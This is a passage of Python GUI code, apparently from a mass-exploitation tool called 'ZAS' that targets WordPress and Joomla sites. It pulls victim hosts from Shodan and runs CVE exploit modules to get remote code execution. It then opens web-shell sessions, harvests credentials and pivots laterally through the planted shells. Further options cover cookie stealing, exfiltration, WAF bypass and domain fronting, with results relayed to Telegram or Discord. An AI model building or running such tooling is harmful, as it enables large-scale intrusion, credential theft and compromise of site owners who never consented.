        self._details_frame.place(relx=1.0, rely=0, anchor="ne", relwidth=0.42, relheight=1.0)
        self._details_visible = True

        tk.Label(self._details_frame, text="Module Details", font=("Consolas", 11, "bold"),
                 fg=COLORS["accent"], bg=COLORS["bg3"]).pack(anchor="w", padx=10, pady=(10, 6))
        tk.Button(self._details_frame, text="✕ Закрыть", font=("Consolas", 8),
                  bg=COLORS["bg2"], fg=COLORS["fg"], relief="flat",
                  command=self._hide_module_details).pack(anchor="e", padx=10)

        body = tk.Frame(self._details_frame, bg=COLORS["bg3"])
        body.pack(fill="both", expand=True, padx=10, pady=6)

        sev = r["severity"].upper()
        for label, value in [
            ("CVE", r["cve"]),
            ("Severity", sev),
            ("CMS", r["cms"].title()),
            ("Title", r["title"]),
            ("Module", r["name"]),
            ("Tags", ", ".join(r["tags"]) if r["tags"] else "—"),
            ("Description", r["desc"] or "—"),
        ]:
            tk.Label(body, text=label, font=("Consolas", 8, "bold"),
                     fg=COLORS["fg2"], bg=COLORS["bg3"], anchor="w").pack(fill="x", pady=(6, 0))
            tk.Label(body, text=value, font=("Consolas", 9), fg=COLORS["fg"],
                     bg=COLORS["bg3"], anchor="w", justify="left", wraplength=360).pack(fill="x")

    def _hide_module_details(self):
        self._details_frame.place_forget()
        self._details_visible = False

    def _on_module_toggle(self):
        self._update_settings_state()
        self._update_nav_badge()
        if hasattr(self, "_refresh_modules_table"):
            self._refresh_modules_table()

    def _build_panel_exploit(self, parent):
        tk.Label(parent, text="Exploit Options", font=("Consolas", 12, "bold"),
                 fg=COLORS["accent"], bg=COLORS["bg"]).pack(anchor="w", pady=(0, 8))
        form = tk.Frame(parent, bg=COLORS["bg"])
        form.pack(fill="both", expand=True)
        form.columnconfigure(0, weight=1)
        form.columnconfigure(1, weight=1)

        left = ttk.LabelFrame(form, text=" Credentials / Payload ", padding=8)
        left.grid(row=0, column=0, sticky="nsew", padx=(0, 6))
        right = ttk.LabelFrame(form, text=" Proxy ", padding=8)
        right.grid(row=0, column=1, sticky="nsew", padx=(6, 0))

        self.username_entry = self._add_field(left, 0, "User", "username_var", "")
        self.password_entry = self._add_field(left, 1, "Pass", "password_var", "", show="*")
        self.cmd_entry = self._add_field(left, 2, "Cmd", "cmd_var", "id")
        self.shell_token_entry = self._add_field(left, 3, "Token", "shell_token_var", "zas")
        self.payload_url_entry = self._add_field(left, 4, "Payload URL", "payload_url_var", "")

        ttk.Label(left, text="Payload .php", font=("Consolas", 8)).grid(row=5, column=0, sticky="w", pady=2)
        pf = ttk.Frame(left)
        pf.grid(row=5, column=1, sticky="ew", pady=2, padx=(4, 0))
        self.payload_file_var = tk.StringVar()
        self.payload_file_entry = ttk.Entry(pf, textvariable=self.payload_file_var)
        self.payload_file_entry.pack(side="left", fill="x", expand=True)
        ttk.Button(pf, text="···", command=self._browse_payload, width=3).pack(side="right")
        left.columnconfigure(1, weight=1)

        ttk.Label(right, text="Proxy list", font=("Consolas", 8)).grid(row=0, column=0, sticky="w")
        self.proxy_label = ttk.Label(right, text="none", foreground=COLORS["fg2"], font=("Consolas", 9))
        self.proxy_label.grid(row=1, column=0, sticky="w", pady=4)
        self.proxy_count_var = tk.StringVar(value="")
        ttk.Label(right, textvariable=self.proxy_count_var, foreground=COLORS["fg2"]).grid(row=2, column=0, sticky="w")
        btns = ttk.Frame(right)
        btns.grid(row=3, column=0, sticky="w", pady=8)
        ttk.Button(btns, text="Load File", command=self._load_proxy_file).pack(side="left", padx=(0, 4))
        ttk.Button(btns, text="Clear", command=self._clear_proxies).pack(side="left")

    def _build_panel_advanced(self, parent):
        tk.Label(parent, text="Advanced", font=("Consolas", 12, "bold"),
                 fg=COLORS["accent"], bg=COLORS["bg"]).pack(anchor="w", pady=(0, 8))
        grid = tk.Frame(parent, bg=COLORS["bg"])
        grid.pack(fill="both", expand=True)

        self.fingerprint_var = tk.BooleanVar(value=False)
        self.waf_detect_var = tk.BooleanVar(value=False)
        self.cookie_steal_var = tk.BooleanVar(value=False)
        self.cred_harvest_var = tk.BooleanVar(value=False)
        self.pivot_var = tk.BooleanVar(value=False)
        self.domain_front_var = tk.BooleanVar(value=False)
        self.req_sign_var = tk.BooleanVar(value=False)
        self.exfiltration_var = tk.BooleanVar(value=False)

        items = [
            (self.fingerprint_var, "Passive Fingerprinting"),
            (self.waf_detect_var, "WAF Detection + Bypass"),
            (self.cookie_steal_var, "Cookie Stealer"),
            (self.cred_harvest_var, "Credential Harvesting"),
            (self.pivot_var, "Pivot / Lateral Movement"),
            (self.domain_front_var, "Domain Fronting"),
            (self.req_sign_var, "Request Signing"),
            (self.exfiltration_var, "Exfiltration"),
        ]
        for i, (var, text) in enumerate(items):
            r, c = divmod(i, 2)
            tk.Checkbutton(grid, text=text, variable=var, bg=COLORS["bg"], fg=COLORS["fg"],
                           selectcolor=COLORS["bg3"], activebackground=COLORS["bg"],
                           font=("Consolas", 9), anchor="w").grid(row=r, column=c, sticky="w", pady=4, padx=8)
        self.exfiltration_cb = grid.winfo_children()[-1]

    def _build_panel_shodan(self, parent):
        tk.Label(parent, text="Shodan", font=("Consolas", 12, "bold"),
                 fg=COLORS["accent"], bg=COLORS["bg"]).pack(anchor="w", pady=(0, 8))
        bar = ttk.LabelFrame(parent, text=" Search ", padding=8)
        bar.pack(fill="x")
        row = ttk.Frame(bar)
        row.pack(fill="x")
        ttk.Label(row, text="Key", font=("Consolas", 8)).pack(side="left")
        self.shodan_key_var = tk.StringVar()
        ttk.Entry(row, textvariable=self.shodan_key_var, show="*", width=28).pack(side="left", padx=6)
        ttk.Label(row, text="Query", font=("Consolas", 8)).pack(side="left")
        self.shodan_query_var = tk.StringVar()
        ttk.Entry(row, textvariable=self.shodan_query_var, width=36).pack(side="left", padx=6, fill="x", expand=True)
        btns = ttk.Frame(bar)
        btns.pack(fill="x", pady=(8, 0))
        ttk.Button(btns, text="Search", command=self._shodan_search, width=10).pack(side="left", padx=(0, 4))
        ttk.Button(btns, text="WP Scan", command=self._shodan_wp, width=10).pack(side="left", padx=(0, 4))
        ttk.Button(btns, text="Joomla", command=self._shodan_joomla, width=10).pack(side="left")

    def _build_panel_notify(self, parent):
        tk.Label(parent, text="Notifications", font=("Consolas", 12, "bold"),
                 fg=COLORS["accent"], bg=COLORS["bg"]).pack(anchor="w", pady=(0, 8))
        box = ttk.LabelFrame(parent, text=" Channels ", padding=8)
        box.pack(fill="x")
        self._add_field(box, 0, "TG Token", "tg_token_var", "", show="*")
        self._add_field(box, 1, "TG Chat", "tg_chat_var", "")
        self._add_field(box, 2, "Slack", "slack_webhook_var", "")
        self._add_field(box, 3, "Discord", "discord_webhook_var", "")
        box.columnconfigure(1, weight=1)

    def _build_panel_shells(self, parent):
        tk.Label(parent, text="Shell Sessions", font=("Consolas", 12, "bold"),
                 fg=COLORS["accent"], bg=COLORS["bg"]).pack(anchor="w", pady=(0, 4))
        tk.Label(parent,
                 text="Run a scan in Exploit mode to open sessions here.",
                 font=("Segoe UI", 9), fg=COLORS["fg2"], bg=COLORS["bg"]).pack(anchor="w", padx=2, pady=(0, 6))
        self.shell_manager = ShellTabManager(parent)

    def _update_shells_nav_badge(self):
        try:
            n = len(self.shell_manager.tabs) if hasattr(self, "shell_manager") else 0
            label = f"🖥  Shells" if n == 0 else f"🖥  Shells  {n}"
            self._nav_buttons["shells"].configure(text=label)
        except Exception:
            pass

    def _show_panel_shells_hint(self):
        pass

    def _build_output(self, parent):
        lf = ttk.LabelFrame(parent, text=" Output ", padding=4)
        lf.pack(fill="both", expand=True)

        self.log_text = scrolledtext.ScrolledText(
            lf, font=("Consolas", 8),
            bg=COLORS["bg2"], fg=COLORS["fg"],
            insertbackground=COLORS["fg"], selectbackground=COLORS["accent"],
            borderwidth=0, wrap="word",
        )
        self.log_text.pack(fill="both", expand=True)
        self.log_text.configure(state="disabled")
        for tag, color in [("info", COLORS["fg"]), ("success", COLORS["green"]),
                           ("error", COLORS["red"]), ("warn", COLORS["yellow"]),
                           ("vuln", COLORS["cyan"]), ("header", COLORS["accent"]),
                           ("shell_btn", COLORS["green"]), ("pause", COLORS["yellow"])]:
            self.log_text.tag_configure(tag, foreground=color)

        ctrl = ttk.Frame(lf)
        ctrl.pack(fill="x", pady=(4, 0))
        for txt, cmd in [("Clear", self._clear_log), ("Save", self._save_log),
                         ("HTML", self._save_html_report), ("CSV", self._export_csv),
                         ("SARIF", self._export_sarif), ("Cleanup", self._cleanup_shells)]:
            ttk.Button(ctrl, text=txt, command=cmd, width=7).pack(side="left", padx=(0, 2))

    def _build_status(self):
        status_frame = ttk.Frame(self.root)
        status_frame.pack(fill="x", side="bottom")
        tk.Frame(status_frame, height=1, bg=COLORS["border"]).pack(fill="x")
        self.progress = ttk.Progressbar(status_frame, mode="determinate", length=200,
                                        style="Accent.Horizontal.TProgressbar")
        self.progress.pack(fill="x", padx=10, pady=(2, 0))
        self.progress["value"] = 0
        self.status_var = tk.StringVar(value="Ready")
        bar = tk.Frame(status_frame, bg=COLORS["bg2"])
        bar.pack(fill="x")
        tk.Label(bar, textvariable=self.status_var, bg=COLORS["bg2"], fg=COLORS["fg2"],
                 font=("Segoe UI", 8), anchor="w", padx=8, pady=3).pack(side="left")
        self._status_stats = tk.Label(bar, text="", bg=COLORS["bg2"], fg=COLORS["fg2"],
                                      font=("Consolas", 8), padx=8)
        self._status_stats.pack(side="right", padx=4)
        self._status_mode = tk.Label(bar, text="mode: exploit", bg=COLORS["bg2"], fg=COLORS["accent"],
                                     font=("Consolas", 8), padx=8)
        self._status_mode.pack(side="right")
        self.mode_var.trace_add("write", lambda *a: self._refresh_status_stats())
        self._refresh_status_stats()

    def _refresh_status_stats(self):
        try:
            n_sel = sum(1 for v in self.module_vars.values() if v.get())
            threads = self.threads_var.get()
            mode = self.mode_var.get()
            self._status_mode.configure(text=f"mode: {mode}")
            self._status_stats.configure(
                text=f"Выбрано модулей: {n_sel} · Потоков: {threads}",
                cursor="hand2")
            self._status_stats.bind("<Button-1>", self._status_selected_clicked)
        except Exception:
            pass

    def _status_selected_clicked(self, event=None):
        self._show_panel("modules")
        if not self._filter_state.get("selected_only"):
            self._toggle_filter("selected_only")
        else:
            self._refresh_modules_table()

    def _add_field(self, parent, row, label, var_name, default, show=None):
        ttk.Label(parent, text=label, font=("Consolas", 8)).grid(row=row, column=0, sticky="w", pady=2)
        var = tk.StringVar(value=default)
        setattr(self, var_name, var)
        entry = ttk.Entry(parent, textvariable=var, show=show)
        entry.grid(row=row, column=1, sticky="ew", pady=2, padx=(4, 0))
        return entry

    def _toggle_settings(self):
        self._show_panel("advanced")

    def _minimize(self, event=None):
        try:
            self.root.iconify()
        except Exception:
            pass

    def _maximize(self, event=None):
        try:
            if self.root.state() == "zoomed":
                self.root.state("normal")
            else:
                self.root.state("zoomed")
        except Exception:
            pass

    def _close(self, event=None):
        self.root.destroy()

    def _start_drag(self, event):
        self._drag_x = event.x
        self._drag_y = event.y

    def _do_drag(self, event):
        x = self.root.winfo_x() + (event.x - self._drag_x)
        y = self.root.winfo_y() + (event.y - self._drag_y)
        self.root.geometry(f"+{x}+{y}")

    def _add_shell_button(self, shell_url, token, cve, url, mod=None, pseudo=False):
        """Add a [+] button in the log to open a shell tab."""
        def open_shell():
            if pseudo and mod:
                # Create exploit function for pseudo-shell
                def exploit_func(cmd):
                    try:
                        result = mod.exploit(url, cmd=cmd, timeout=15)
                        return result
                    except Exception as e:
                        return {"ok": False, "reason": str(e)}
                self.root.after(0, lambda: self._open_shell_tab(shell_url, token, cve, url, exploit_func=exploit_func))
            else:
                self.root.after(0, lambda: self._open_shell_tab(shell_url, token, cve, url))
        
        # Log the [+] button
        self.log_text.configure(state="normal")
        label = "  [+] Open Shell" if not pseudo else "  [+] Pseudo Shell"
        self.log_text.insert("end", label, "shell_btn")
        
        # Make it clickable
        tag_name = f"shell_{id(shell_url)}"
        self.log_text.tag_add(tag_name, f"end-1l", "end")
        self.log_text.tag_configure(tag_name, foreground=COLORS["green"], underline=True)
        self.log_text.tag_bind(tag_name, "<Button-1>", lambda e: open_shell())
        self.log_text.tag_bind(tag_name, "<Enter>", lambda e: self.log_text.configure(cursor="hand2"))
        self.log_text.tag_bind(tag_name, "<Leave>", lambda e: self.log_text.configure(cursor=""))
        
        self.log_text.configure(state="disabled")
        self.log_text.see("end")
    
    def _open_shell_tab(self, shell_url, token, cve, url, exploit_func=None):
        """Open a new shell tab in the left-nav Shells panel."""
        self.shell_manager.add_tab(shell_url, token, cve, url, exploit_func=exploit_func)
        self._update_shells_nav_badge()
        self._show_panel("shells")

    def _get_config_path(self):
        return os.path.join(self.base_dir, "zas_config.json")

    def _load_config(self):
        import json
        path = self._get_config_path()
        if not os.path.exists(path):
            return
        try:
            with open(path, "r", encoding="utf-8") as f:
                cfg = json.load(f)
            self.mode_var.set(cfg.get("mode", "exploit"))
            self.threads_var.set(cfg.get("threads", "10"))
            self.timeout_var.set(cfg.get("timeout", "15"))
            self.cmd_var.set(cfg.get("cmd", "id"))
            self.payload_url_var.set(cfg.get("payload_url", ""))
            self.shell_token_var.set(cfg.get("shell_token", "zas"))
            self.payload_file_var.set(cfg.get("payload_file", ""))
            self.jitter_var.set(cfg.get("jitter", "0.3-2.0"))
            self.delay_var.set(cfg.get("delay", "0"))
            self.skip_validation_var.set(cfg.get("skip_validation", False))
            self.ignore_ssl_var.set(cfg.get("ignore_ssl", True))
            self.username_var.set(cfg.get("username", ""))
            self.password_var.set(cfg.get("password", ""))
            for name, var in self.module_vars.items():
                if name in cfg.get("modules", {}):
                    var.set(cfg["modules"][name])
        except Exception:
            pass

    def _save_config(self):
        import json
        # Clamp numeric settings so config never stores 0/huge values
        try:
            threads = max(1, min(100, int(self.threads_var.get() or 10)))
        except ValueError:
            threads = 10
        try:
            timeout = max(1, min(300, int(self.timeout_var.get() or 15)))
        except ValueError:
            timeout = 15
        cfg = {
            "mode": self.mode_var.get(),
            "threads": str(threads),
            "timeout": str(timeout),
            "cmd": self.cmd_var.get(),
            "payload_url": self.payload_url_var.get(),
            "shell_token": self.shell_token_var.get(),
            "payload_file": self.payload_file_var.get(),
            "jitter": self.jitter_var.get(),
            "delay": self.delay_var.get(),
            "skip_validation": self.skip_validation_var.get(),
            "ignore_ssl": self.ignore_ssl_var.get(),
            "username": self.username_var.get(),
            "password": self.password_var.get(),
            "modules": {name: var.get() for name, var in self.module_vars.items()},
        }
        try:
            with open(self._get_config_path(), "w", encoding="utf-8") as f:
                json.dump(cfg, f, indent=2)
        except OSError as e:
            self.log(f"[!] Config save failed: {e}", "error")

    def _open_telegram(self):
        import webbrowser
        webbrowser.open("https://t.me/vaalzevul")

    def log(self, msg, tag="info"):
        self.log_queue.put((msg, tag))

    def _process_log_queue(self):
        while not self.log_queue.empty():
            try:
                msg, tag = self.log_queue.get_nowait()
                self.log_text.configure(state="normal")
                self.log_text.insert("end", msg + "\n", tag)
                self.log_text.see("end")
                self.log_text.configure(state="disabled")
            except queue.Empty:
                break
        self.root.after(100, self._process_log_queue)

    def _load_file(self):
        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if not path:
            return
        try:
            with open(path, encoding="utf-8") as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            seen = set(self.targets)
            added = 0
            for l in lines:
                if l not in seen:
                    self.targets.append(l)
                    seen.add(l)
                    added += 1
            self._update_target_count()
            self._save_target_history(lines)
            self.log(f"[+] Loaded {added} targets ({len(lines) - added} duplicates skipped)", "success")
        except Exception as e:
            self.log(f"[!] {e}", "error")

    def _save_target_history(self, lines):
        try:
            hist_dir = os.path.join(self.base_dir, "reports")
            os.makedirs(hist_dir, exist_ok=True)
            hist_path = os.path.join(hist_dir, "targets_history.txt")
            existing = set()
            if os.path.exists(hist_path):
                with open(hist_path, encoding="utf-8") as f:
                    existing = {l.strip() for l in f if l.strip()}
            with open(hist_path, "a", encoding="utf-8") as f:
                for l in lines:
                    if l and l not in existing:
                        f.write(l + "\n")
        except Exception:
            pass

    def _browse_payload(self):
        path = filedialog.askopenfilename(filetypes=[("PHP files", "*.php"), ("All files", "*.*")])
        if path:
            self.payload_file_var.set(path)

    def _load_proxies(self):
        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if not path:
            return
        try:
            from zas_core import load_proxies
            count = load_proxies(path)
            self.proxy_count_var.set(f"{count} proxies loaded")
            self.log(f"[+] Loaded {count} proxies from {path}", "success")
        except Exception as e:
            self.log(f"[!] {e}", "error")

    def _add_target(self):
        url = self.target_entry.get().strip()
        if url and not url.startswith("Enter"):
            if url not in self.targets:
                self.targets.append(url)
            self.target_entry.delete(0, "end")
            self._update_target_count()

    def _clear_targets(self):
        self.targets.clear()
        self._update_target_count()

    def _update_target_count(self):
        self.target_count.configure(text=f"{len(self.targets)} target(s)")

    def _select_all(self):
        for row in getattr(self, "_module_rows", []):
            row["var"].set(True)
        for var in self.module_vars.values():
            var.set(True)
        self._update_settings_state()
        if hasattr(self, "_refresh_modules_table"):
            self._refresh_modules_table()

    def _deselect_all(self):
        for row in getattr(self, "_module_rows", []):
            row["var"].set(False)
        for var in self.module_vars.values():
            var.set(False)
        self._update_settings_state()
        if hasattr(self, "_refresh_modules_table"):
            self._refresh_modules_table()

    def _classify_exp(self, exp):
        try:
            from registry import classify
            return classify(exp.get("plugin", ""))
        except ImportError:
            from gui_config import classify_exp
            return classify_exp(exp)

    def _select_wp(self):
        self._select_cms("wordpress")

    def _select_joomla(self):
        self._select_cms("joomla")

    def _select_other(self):
        self._select_cms("other")

    def _select_cms(self, cms):
        for row in getattr(self, "_module_rows", []):
            row["var"].set(row["cms"] == cms)
        self._update_settings_state()
        if hasattr(self, "_refresh_modules_table"):
            self._refresh_modules_table()

    def _update_settings_state(self):
        selected = [n for n, v in self.module_vars.items() if v.get()]
        selected_exploits = [self.exploits[n] for n in selected if n in self.exploits]

        all_tags = set()
        for exp in selected_exploits:
            all_tags.update(exp.get("tags", []))

        has_sel = len(selected) > 0
        has_rce = "rce" in all_tags
        has_username = "username" in all_tags
        has_password = "password" in all_tags

        # Check if any selected module is WordPress
        has_wp = any(self._classify_exp(exp) == "wordpress" for exp in selected_exploits)

        self.username_entry.configure(state="normal" if has_sel and has_username else "disabled")
        self.password_entry.configure(state="normal" if has_sel and has_password else "disabled")
        self.cmd_entry.configure(state="normal" if has_sel and has_rce else "disabled")
        self.payload_url_entry.configure(state="normal" if has_sel and has_rce else "disabled")
        self.shell_token_entry.configure(state="normal" if has_sel and has_rce else "disabled")
        self.payload_file_entry.configure(state="normal" if has_sel and has_rce else "disabled")
        self._update_nav_badge()
        self._refresh_status_stats()

    def _clear_log(self):
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.configure(state="disabled")

    def _save_log(self):
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            initialfile=f"zas_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            filetypes=[("Text", "*.txt")],
        )
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(self.log_text.get("1.0", "end"))
            self.log(f"[+] Saved: {path}", "success")

    def _load_proxy_file(self):
        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if not path:
            return
        from zas_core import load_proxies
        count = load_proxies(path)
        self.proxy_label.configure(text=f"{count} proxies")
        self.log(f"[+] Loaded {count} proxies from {os.path.basename(path)}", "success")

    def _clear_proxies(self):
        from zas_core import load_proxy_list
        load_proxy_list([])
        self.proxy_label.configure(text="none")
        self.log("[*] Proxies cleared", "info")

    def _export_csv(self):
        with self.results_lock:
            snapshot = list(self.results_data)
        if not snapshot:
            messagebox.showinfo("ZAS", "No results to export. Run a scan first.")
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".csv",
            initialfile=f"zas_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            filetypes=[("CSV", "*.csv")],
        )
        if not path:
            return
        export_csv(snapshot, path)
        self.log(f"[+] CSV exported: {path}", "success")

    def _export_sarif(self):
        with self.results_lock:
            snapshot = list(self.results_data)
        if not snapshot:
            messagebox.showinfo("ZAS", "No results to export. Run a scan first.")
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".sarif",
            initialfile=f"zas_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sarif",
            filetypes=[("SARIF", "*.sarif")],
        )
        if not path:
            return
        export_sarif(snapshot, path)
        self.log(f"[+] SARIF exported: {path}", "success")

    def _auto_save_results(self):
        with self.results_lock:
            snapshot = list(self.results_data)
        if not snapshot:
            return
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        reports_dir = os.path.join(self.base_dir, "reports", ts)
        os.makedirs(reports_dir, exist_ok=True)

        scan_info = {
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "targets": len(self.targets),
            "modules": len([v for v in self.module_vars.values() if v.get()]),
            "mode": self.mode_var.get(),
        }

        export_txt(snapshot, reports_dir, ts)
        export_json(snapshot, reports_dir, ts)
        html_path = os.path.join(reports_dir, f"zas_report_{ts}.html")
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(generate_html(snapshot, scan_info))

        self.log(f"[+] Results saved: reports/{ts}/", "success")

    def _generate_html(self, data, scan_info):
        return generate_html(data, scan_info)

    def _save_html_report(self):
        if not self.scan_completed:
            messagebox.showinfo("ZAS", "No results to report. Run a scan first.")
            return

        path = filedialog.asksaveasfilename(
            defaultextension=".html",
            initialfile=f"zas_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html",
            filetypes=[("HTML", "*.html")],
        )
        if not path:
            return

        scan_info = {
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "targets": len(self.targets),
            "modules": len([v for v in self.module_vars.values() if v.get()]),
            "mode": self.mode_var.get(),
        }

        with self.results_lock:
            snapshot = list(self.results_data)
        html = self._generate_html(snapshot, scan_info)
        with open(path, "w", encoding="utf-8") as f:
            f.write(html)

        self.log(f"[+] HTML report: {path}", "success")

        import webbrowser
        webbrowser.open(f"file://{os.path.abspath(path)}")

    def _cleanup_shells(self):
        from zas_cleanup import cleanup_tracker
        items = cleanup_tracker.get_items()
        if not items:
            messagebox.showinfo("ZAS", "No shells or users to clean up.")
            return
        if not messagebox.askyesno("ZAS", f"Clean up {len(items)} items (shells, users, templates)?"):
            return
        self.log("[*] Starting cleanup...", "info")
        def do_cleanup():
            results = cleanup_tracker.cleanup_all(log_func=lambda msg: self.log(msg, "info"))
            self.root.after(0, lambda: self.log(f"[+] Cleanup complete: {len(results)} items processed", "success"))
            self.root.after(0, lambda: cleanup_tracker.clear())
        threading.Thread(target=do_cleanup, daemon=True).start()

    # ─── Advanced Features ─────────────────────────────────────────────────

    def _init_notifications(self):
        """Initialize notification manager from GUI config (cached)."""
        if not HAS_ADVANCED:
            return None
        if hasattr(self, '_notif_manager') and self._notif_manager:
            return self._notif_manager
        nm = NotificationManager()
        # Telegram
        tg_token = self.tg_token_var.get().strip() if hasattr(self, 'tg_token_var') else ""
        tg_chat = self.tg_chat_var.get().strip() if hasattr(self, 'tg_chat_var') else ""
        if tg_token and tg_chat:
            nm.add_telegram(tg_token, tg_chat)
        # Slack
        slack_webhook = self.slack_webhook_var.get().strip() if hasattr(self, 'slack_webhook_var') else ""
        if slack_webhook:
            nm.add_slack(slack_webhook)
        # Discord
        discord_webhook = self.discord_webhook_var.get().strip() if hasattr(self, 'discord_webhook_var') else ""
        if discord_webhook:
            nm.add_discord(discord_webhook)
        self._notif_manager = nm
        return nm

    def _shodan_search(self):
        """Search Shodan with custom query."""
        if not HAS_ADVANCED:
            messagebox.showinfo("ZAS", "Advanced features not available.")
            return
        api_key = self.shodan_key_var.get().strip()
        query = self.shodan_query_var.get().strip()
        if not api_key:
            messagebox.showwarning("ZAS", "Enter Shodan API key!")
            return
        if not query:
            messagebox.showwarning("ZAS", "Enter search query!")
            return
        self.log(f"[*] Shodan search: {query}", "info")
        def do_search():
            try:
                from zas_recon import ShodanAPI
                api = ShodanAPI(api_key)
                result = api.search(query, limit=50)
                if "error" in result:
                    self.log(f"[!] Shodan error: {result['error']}", "error")
                    return
                hosts = result.get("hosts", [])
                total = result.get("total", 0)
                self.log(f"[+] Shodan: {total} results found, showing {len(hosts)}", "success")
                for host in hosts:
                    ip = host.get("ip", "?")
                    port = host.get("port", "?")
                    org = host.get("org", "?")
                    product = host.get("product", "?")
                    self.log(f"    {ip}:{port} ({product}) - {org}", "info")
                    # Add to targets
                    scheme = "https" if port == 443 else "http"
                    if port in (80, 443):
                        target = f"{scheme}://{ip}"
                    else:
                        target = f"{scheme}://{ip}:{port}"
                    if target not in self.targets:
                        self.targets.append(target)
                self._update_target_count()
            except Exception as e:
                self.log(f"[!] Shodan error: {e}", "error")
        threading.Thread(target=do_search, daemon=True).start()

    def _shodan_wp(self):
        """Search Shodan for WordPress installations."""
        self.shodan_query_var.set('"X-Powered-By: WordPress"')
        self._shodan_search()

    def _shodan_joomla(self):
        """Search Shodan for Joomla installations."""
        self.shodan_query_var.set('"X-Content-Encoded-By: Joomla"')
        self._shodan_search()

    def _run_fingerprint(self, url, response_text, response_headers, cookies=None):
        """Run passive fingerprinting on a target."""
        if not HAS_ADVANCED or not getattr(self, 'fingerprint_var', None) or not self.fingerprint_var.get():
            return None
        try:
            result = fingerprint_cms(response_text, response_headers, cookies)
            techs = fingerprint_technologies(response_text, response_headers)
            result["technologies"] = list(set(result.get("technologies", []) + techs))
            return result
        except Exception as e:
            self.log(f"[FP] Error: {e}", "error")
            return None

    def _run_waf_detection(self, url, response_text, response_headers, cookies=None, status_code=None):
        """Run WAF detection on a target."""
        if not HAS_ADVANCED or not getattr(self, 'waf_detect_var', None) or not self.waf_detect_var.get():
            return None
        try:
            result = detect_waf(response_text, response_headers, cookies, status_code)
            if result.get("waf"):
                bypasses = get_waf_bypass_techniques(result["waf"])
                result["bypasses"] = bypasses
            return result
        except Exception as e:
            self.log(f"[WAF] Error: {e}", "error")
            return None

    def _run_credential_harvest(self, url, timeout=15, proxies=None):
        """Run credential harvesting on a compromised host."""
        if not HAS_ADVANCED or not getattr(self, 'cred_harvest_var', None) or not self.cred_harvest_var.get():
            return []
        all_creds = []
        try:
            from zas_core import create_session
            s = create_session(proxies)
            # Get shell URL from results
            shell_url = None
            shell_token = None
            with self.results_lock:
                for r in self.results_data:
                    if r.get("url") == url and r.get("details", {}).get("shell_url"):
                        shell_url = r["details"]["shell_url"]
                        shell_token = r["details"].get("token")
                        break
            if not shell_url:
                return []
            self.log(f"[CREDS] Harvesting credentials from {url}...", "info")
            for source, cmd in HARVEST_COMMANDS[:10]:  # Limit to first 10 commands
                try:
                    params = {"c": cmd}
                    if shell_token:
                        params["t"] = shell_token
                    r = s.get(shell_url, params=params, timeout=timeout, verify=_get_ssl_verify())
                    if r.status_code == 200 and r.text.strip():
                        creds = parse_credential_output(source, r.text)
                        all_creds.extend(creds)
                except Exception:
                    continue
            if all_creds:
                self.log(f"[CREDS] Found {len(all_creds)} credential(s)", "success")
                report = format_creds_report(all_creds)
                self.log(report, "info")
        except Exception as e:
            self.log(f"[CREDS] Error: {e}", "error")
        return all_creds

    def _run_pivot(self, url, timeout=15, proxies=None):
        """Run pivot/lateral movement on a compromised host."""
        if not HAS_ADVANCED or not getattr(self, 'pivot_var', None) or not self.pivot_var.get():
            return []
        all_targets = []
        try:
            from zas_core import create_session
            s = create_session(proxies)
            shell_url = None
            shell_token = None
            with self.results_lock:
                for r in self.results_data:
                    if r.get("url") == url and r.get("details", {}).get("shell_url"):
                        shell_url = r["details"]["shell_url"]
                        shell_token = r["details"].get("token")
                        break
            if not shell_url:
                return []
            self.log(f"[PIVOT] Discovering internal network from {url}...", "info")
            pivot_results = {}
            for category, commands in PIVOT_COMMANDS.items():
                pivot_results[category] = {}
                for cmd_name, cmd in commands[:3]:  # Limit per category
                    try:
                        params = {"c": cmd}
                        if shell_token:
                            params["t"] = shell_token
                        r = s.get(shell_url, params=params, timeout=timeout, verify=_get_ssl_verify())
                        if r.status_code == 200 and r.text.strip():
                            parsed = parse_pivot_output(category, cmd_name, r.text)
                            pivot_results[category][cmd_name] = parsed
                    except Exception:
                        continue
            all_targets = generate_pivot_targets(pivot_results)
            if all_targets:
                self.log(f"[PIVOT] Found {len(all_targets)} internal target(s)", "success")
                report = format_pivot_report(pivot_results, all_targets)
                self.log(report, "info")
            else:
                self.log("[PIVOT] No internal targets found", "info")
        except Exception as e:
            self.log(f"[PIVOT] Error: {e}", "error")
        return all_targets

    def _send_notification(self, cve, url, status, details=None):
        """Send notification about a finding."""
        if not HAS_ADVANCED:
            return
        try:
            nm = self._init_notifications()
            if nm and nm.get_configured_channels():
                nm.notify_vuln(cve, url, status, details)
        except Exception:
            pass


    def _start_scan(self):
        if not self.targets:
            messagebox.showwarning("ZAS", "No targets!")
            return
        selected = [n for n, v in self.module_vars.items() if v.get()]
        if not selected:
            messagebox.showwarning("ZAS", "No modules selected!")
            return

        self._save_config()
        _set_ignore_ssl(self.ignore_ssl_var.get())
        self.scanning = True
        audit_path = audit_log.open(self.base_dir)
        if audit_path:
            self.log(f"[*] Audit log: {audit_path}", "info")
        self.paused = False
        self.pause_event.set()
        self.results_data = []
        self.progress["value"] = 0
        self.start_btn.configure(state="disabled")
        self.pause_btn.configure(state="normal")
        self.stop_btn.configure(state="normal")

        mode = self.mode_var.get()
        self.log("", "info")
        self.log("=" * 50, "header")
        self.log(f"  Scan | {datetime.now().strftime('%H:%M:%S')} | {mode} | {len(self.targets)} targets | {len(selected)} modules", "header")
        self.log("=" * 50, "header")
        self.status_var.set("Preloading modules...")

        self.status_var.set("Validating targets...")

        self.scan_thread = threading.Thread(
